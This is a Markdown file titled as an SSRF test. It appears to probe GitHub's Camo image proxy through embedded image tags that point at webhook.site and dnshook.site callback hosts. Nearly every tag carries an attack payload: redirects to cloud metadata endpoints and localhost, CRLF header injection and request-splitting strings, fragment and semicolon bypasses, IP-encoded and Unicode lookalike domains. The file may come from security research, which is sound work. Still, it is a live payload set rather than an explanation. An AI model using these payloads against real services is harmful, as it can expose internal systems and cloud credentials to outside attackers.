# SSRF Test v12 - Camo Direct URL Manipulation & Edge Cases

## Baseline
![v12-canary](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/v12-canary.gif)

## Query Parameter Poisoning
![qp1](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?url=http://169.254.169.254/latest/meta-data/)
![qp2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?redirect=http://127.0.0.1/admin)
![qp3](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?next=http://localhost:8080/)
![qp4](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?callback=http://internal.github.com/api)
![qp5](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?target=http://metadata.google.internal/computeMetadata/v1/)
![qp6](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?host=169.254.169.254&path=/latest/meta-data/)

## CRLF in Query String
![cqp1](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?x=%0d%0aHost:%20169.254.169.254%0d%0a)
![cqp2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?x=%0d%0a%0d%0aGET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a)
![cqp3](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test?x=1&y=%0d%0aX-Injected:%20true%0d%0a&z=2)

## Fragment Tests for Bypass
![frag1](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test#http://169.254.169.254/)
![frag2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test%23http://169.254.169.254/)
![frag3](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test#@169.254.169.254)

## Space-Based Request Splitting
![spc1](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/a%20HTTP/1.1%0d%0a%0d%0aGET%20http://169.254.169.254/)
![spc2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/a%20b%20c.gif)
![spc3](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/a%09b.gif)

## Subdomain-Based Attacks
<picture><source srcset="https://169.254.169.254.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/sub1.gif"></picture>
<picture><source srcset="https://127-0-0-1.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/sub2.gif"></picture>
<picture><source srcset="https://metadata.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/sub3.gif"></picture>
<picture><source srcset="https://0x7f000001.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/sub4.gif"></picture>
<picture><source srcset="https://internal.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/sub5.gif"></picture>

## Unicode Domain Tests
<picture><source srcset="https://ⓦⓔⓑⓗⓞⓞⓚ.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/uni1.gif"></picture>
<picture><source srcset="https://ｗｅｂｈｏｏｋ.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/uni2.gif"></picture>

## Mixed Case/Encoding in Path
![mix1](https://WEBHOOK.SITE/d974b98a-cec4-4c41-aaf1-2a0db7531b88/MiXeD-case.gif)
![mix2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/%77%65%62%68%6F%6F%6B.gif)

## Semicolon Path Parameters
![semi1](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test;host=169.254.169.254)
![semi2](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test;redirect=http://localhost/)
![semi3](https://webhook.site/d974b98a-cec4-4c41-aaf1-2a0db7531b88/test;jsessionid=AAAA?url=internal)

## Special Port Tests
![port1](https://webhook.site:80/d974b98a-cec4-4c41-aaf1-2a0db7531b88/port80.gif)
![port2](https://webhook.site:8080/d974b98a-cec4-4c41-aaf1-2a0db7531b88/port8080.gif)
![port3](https://webhook.site:443/d974b98a-cec4-4c41-aaf1-2a0db7531b88/port443.gif)

## DNS Markers
![dns1](https://v12-test.d974b98a-cec4-4c41-aaf1-2a0db7531b88.dnshook.site/dns.gif)

## Version Marker
Timestamp: v12-camo-direct-manipulation
